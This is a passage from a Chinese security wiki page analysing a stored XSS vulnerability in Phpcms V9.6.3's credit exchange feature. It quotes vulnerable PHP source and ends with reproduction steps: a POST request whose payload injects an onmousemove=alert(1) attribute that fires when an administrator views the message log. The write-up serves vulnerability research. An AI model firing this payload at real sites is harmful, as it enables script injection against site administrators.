+<span class="w">  </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">credit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">floor</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">credit</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">$</span><span class="n">outcredit</span><span class="p">[</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">from</span><span class="o">.</span><span class="s1">&#39;_&#39;</span><span class="o">.$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">to</span><span class="p">][</span><span class="s1">&#39;torate&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">$</span><span class="n">outcredit</span><span class="p">[</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">from</span><span class="o">.</span><span class="s1">&#39;_&#39;</span><span class="o">.$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">to</span><span class="p">][</span><span class="s1">&#39;fromrate&#39;</span><span class="p">]);</span>
+
+<span class="w">  </span><span class="o">/*</span><span class="err">插入消息队列</span><span class="o">*/</span>
+<span class="w">  </span><span class="o">$</span><span class="n">noticedata</span><span class="p">[</span><span class="s1">&#39;appname&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">appname</span><span class="p">;</span>
+<span class="w">  </span><span class="o">$</span><span class="n">noticedata</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">uid</span><span class="p">;</span>
+<span class="w">  </span><span class="o">$</span><span class="n">noticedata</span><span class="p">[</span><span class="s1">&#39;toappid&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">toappid</span><span class="p">;</span>
+<span class="w">  </span><span class="o">$</span><span class="n">noticedata</span><span class="p">[</span><span class="s1">&#39;totypeid&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">to</span><span class="p">;</span>
+<span class="w">  </span><span class="o">$</span><span class="n">noticedata</span><span class="p">[</span><span class="s1">&#39;credit&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">credit</span><span class="p">;</span>
+<span class="w">  </span><span class="n">messagequeue</span><span class="p">::</span><span class="n">add</span><span class="p">(</span><span class="s1">&#39;change_credit&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">noticedata</span><span class="p">);</span>
+<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">);</span>
+<span class="w"> </span><span class="p">}</span>
+
+
+<span class="err">这里是进入数据库了：</span><span class="n">messagequeue</span><span class="p">::</span><span class="n">add</span><span class="p">(</span><span class="s1">&#39;change_credit&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">noticedata</span><span class="p">);</span>
+<span class="w"> </span><span class="n">public</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">add</span><span class="p">(</span><span class="o">$</span><span class="n">operation</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">noticedata_send</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="o">$</span><span class="n">db</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="p">::</span><span class="n">get_db</span><span class="p">();</span>
+<span class="w">  </span><span class="o">$</span><span class="n">noticedata_send</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">operation</span><span class="p">;</span>
+<span class="w">  </span><span class="o">$</span><span class="n">noticedata_send_string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array2string</span><span class="p">(</span><span class="o">$</span><span class="n">noticedata_send</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">noticeid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">db</span><span class="o">-&gt;</span><span class="n">insert</span><span class="p">(</span><span class="n">array</span><span class="p">(</span><span class="s1">&#39;operation&#39;</span><span class="o">=&gt;$</span><span class="n">operation</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;noticedata&#39;</span><span class="o">=&gt;$</span><span class="n">noticedata_send_string</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;dateline&#39;</span><span class="o">=&gt;</span><span class="n">SYS_TIME</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="bp">self</span><span class="p">::</span><span class="n">notice</span><span class="p">(</span><span class="o">$</span><span class="n">operation</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">noticedata_send</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">noticeid</span><span class="p">);</span>
+<span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w"> </span><span class="p">}</span>
+</code></pre></div>
+
+<p>调用insert写入数据。。这里就不跟了。由于系统开启了gpc（两次，初始化一次，phpsso一次），所以进去的数据是经过两次gpc的输出跟模板就不说了，反正没过滤直接出来</p>
+<p>整理一下思路，先从积分兑换填写表单，然后将数据整理成数组经过<code>sys_auth</code>加密一次，然后服务器发送数据包给自己，收到数据包之后用<code>sys_auth</code>函数解密，然后调用<code>changecredit</code>方法，<code>inert</code>插入数据库，然后管理员在后台点击通信信息的时候触发xss!</p>
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>利用方法，先注册一个帐号，然后登录，然后访问:<a href="http://www.0-sec.org/index.php?m=member&amp;c=index&amp;a=change">http://www.0-sec.org/index.php?m=member&amp;c=index&amp;a=change</a>_credit&amp;post:</p>
+<div class="codehilite"><pre><span></span><code>dosubmit=1&amp;fromvalue=0.6&amp;from=1id=1`setset&#39;&amp;to=}&quot; onmousemove=alert(1)&gt;//
+</code></pre></div>
+
+<p><img alt="1.png" src="../resource/PhpcmsV9.6.3%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId26.png" /></p>
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/1860">https://xz.aliyun.com/t/1860</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpcms%20V9.6.3%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpcms%20V9.6.3%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        Phpcms V9.6.3 前台getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Phpcms%20V9.6.3%20install.php%20%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Phpcms%20V9.6.3%20install.php%20%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/" class="btn btn-xs btn-link">
+        Phpcms V9.6.3 install.php 没有即使删除导致的getshell
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
